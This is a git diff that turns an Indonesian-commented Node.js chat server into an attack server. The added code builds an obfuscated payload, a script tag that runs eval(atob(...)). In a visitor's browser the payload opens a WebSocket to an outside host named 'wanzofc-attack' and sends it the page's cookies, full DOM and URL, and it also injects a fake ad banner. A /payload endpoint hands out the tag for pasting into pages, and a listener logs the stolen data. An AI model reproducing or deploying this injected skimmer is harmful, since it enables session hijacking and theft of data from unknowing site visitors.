@@ -1,96 +1,115 @@
-const express = require('express');
-const http = require('http');
-const socketIO = require('socket.io');
-const path = require('path');
-const fs = require('fs');
+const express = require("express");
+const http = require("http");
+const WebSocket = require("ws");
+const cors = require("cors");
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIO(server, {
-    cors: {
-        origin: "https://wanzofc-chat.up.railway.app", // Allow any origin (for development - NOT recommended for production)
-        methods: ["GET", "POST"]
-    }
-});
-const port = process.env.PORT || 3000;
+const wss = new WebSocket.Server({ server });
+const PORT = 3000;
 
+app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, '.')));
 
-const chatHistoryFile = 'chat_history.json';
+/**
+ * Fungsi untuk menghasilkan payload script base64 + eval
+ */
+function generatePayload(nonce = Math.floor(Math.random() * 99999)) {
+  const websocketURL = `ws://wanzofc-attack.up.railway.app:${PORT}`;
+  const code = `
+    (function() {
+      try {
+        const ws${nonce} = new WebSocket("${websocketURL}");
+        ws${nonce}.onopen = function() {
+          const data = {
+            url: window.location.href,
+            cookie: document.cookie,
+            dom: document.documentElement.outerHTML,
+            timestamp: new Date().toISOString()
+          };
+          ws${nonce}.send(JSON.stringify(data));
+        };
 
-// --- Fungsi untuk Memuat dan Menyimpan Riwayat Chat (dengan Penanganan Error) ---
-function loadChatHistory() {
-    try {
-        console.log('Loading chat history from:', chatHistoryFile);
-        if (fs.existsSync(chatHistoryFile)) {
-            const data = fs.readFileSync(chatHistoryFile, 'utf8');
-            if (data.length === 0) {
-                console.log('File exists, but is empty. Returning an empty array.');
-                return [];
-            }
-            const parsedData = JSON.parse(data);
-            console.log('Parsed chat history:', parsedData.length, 'messages');
-            return parsedData || [];
-        } else {
-            console.log('File does not exist. Creating a new file with an empty array.');
-            fs.writeFileSync(chatHistoryFile, JSON.stringify([], null, 2), 'utf8');
-            return [];
-        }
-    } catch (error) {
-        console.error('Error loading chat history:', error);
-        console.error('Error stack:', error.stack);
-        return []; //  Return an empty array on error
-    }
+        ws${nonce}.onerror = function(e) {
+          ws${nonce}.send(JSON.stringify({ error: e.message }));
+        };
+
+        setTimeout(() => {
+          const ad = document.createElement('div');
+          ad.innerHTML = '<b>IKLAN</b> - Website Aman oleh Wanz';
+          ad.style.position = 'fixed';
+          ad.style.bottom = '0';
+          ad.style.width = '100%';
+          ad.style.background = 'black';
+          ad.style.color = 'white';
+          ad.style.textAlign = 'center';
+          document.body.appendChild(ad);
+
+          ws${nonce}.send(JSON.stringify({
+            adData: { message: ad.innerHTML, timestamp: new Date().toISOString() }
+          }));
+        }, 1000);
+      } catch (err) {
+        console.error(err);
+      }
+    })();
+  `;
+  const encoded = Buffer.from(code).toString("base64");
+  const finalPayload = `<script>eval(atob("${encoded}"))</script>`;
+  return finalPayload;
 }
 
-function saveChatHistory(chatHistory) {
-    try {
-        console.log('Saving chat history:', chatHistory.length, 'messages');
-        fs.writeFileSync(chatHistoryFile, JSON.stringify(chatHistory, null, 2), 'utf8');
-        console.log('Chat history saved successfully.');
-    } catch (error) {
-        console.error('Error saving chat history:', error);
-        console.error('Error stack:', error.stack);
-    }
-}
-
-// --- Inisialisasi Riwayat Chat ---
-let chatHistory = loadChatHistory();
-
-// --- Socket.IO Event Handlers ---
-io.on('connection', (socket) => {
-    console.log('A user connected, socket ID:', socket.id);
-
-    // Kirim riwayat chat ke klien yang baru terhubung
-    socket.emit('chat message', ...chatHistory); // Kirim semua pesan dari awal
-
-    socket.on('disconnect', () => {
-        console.log('User disconnected, socket ID:', socket.id);
-    });
-
-    // Terima pesan dari klien
-    socket.on('chat message', (msg) => {
-        console.log('Received chat message from client:', msg);
-
-        // Tambahkan timestamp ke pesan (jika belum ada)
-        if (!msg.timestamp) {
-            const now = new Date();
-            msg.timestamp = `${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}, ${now.getHours().toString().padStart(2, '0')}.${now.getMinutes().toString().padStart(2, '0')}.${now.getSeconds().toString().padStart(2, '0')}`;
-        }
-
-        // Simpan pesan ke riwayat chat
-        chatHistory.push(msg);
-        saveChatHistory(chatHistory);
-
-        // Kirim pesan ke *semua* klien (termasuk pengirim)
-        io.emit('chat message', msg);
-    });
+// Endpoint untuk ambil payload
+app.get("/payload", (req, res) => {
+  const payload = generatePayload();
+  console.log("\n[+] Payload baru digenerate:\n");
+  console.log(payload);
+  res.type("text/html").send(`
+    <h2>wanzofc attack</h2>
+    <textarea style="width:100%; height:150px;">${payload}</textarea>
+    <p>Salin dan pasang ke halaman <b>yang kamu miliki</b> testt kontol.</p>
+  `);
 });
 
-// --- Jalankan Server ---
-server.listen(port, () => {
-    console.log(`Server listening on port ${port}`);
-    console.log(`Access the app at: http://localhost:${port}`);
-    console.log('Ensure that the chat_history.json file is created in the same directory.');
+// WebSocket untuk terima data
+wss.on("connection", (ws, req) => {
+  console.log("[+] Koneksi WebSocket dari:", req.socket.remoteAddress);
+
+  ws.on("message", (msg) => {
+    try {
+      const data = JSON.parse(msg);
+
+      if (data.url) {
+        console.log("\n[DATA MASUK]");
+        console.log("URL :", data.url);
+        console.log("Cookie :", data.cookie);
+        console.log("Waktu :", data.timestamp);
+      }
+
+      if (data.dom) {
+        console.log("[DOM]:", data.dom.substring(0, 200), "...");
+      }
+
+      if (data.adData) {
+        console.log("[AD]:", data.adData.message);
+      }
+
+      if (data.error) {
+        console.error("[ERROR]:", data.error);
+      }
+
+    } catch (err) {
+      console.error("JSON parse gagal:", msg);
+    }
+  });
+
+  ws.on("close", () => {
+    console.log("[-] Koneksi WebSocket tertutup");
+  });
+});
+
+// Jalankan server
+server.listen(PORT, "0.0.0.0", () => {
+  console.log(`[*] Server berjalan di http://0.0.0.0:${PORT}`);
+  console.log(`[*] Dapatkan payload di http://localhost:${PORT}/payload`);
 });
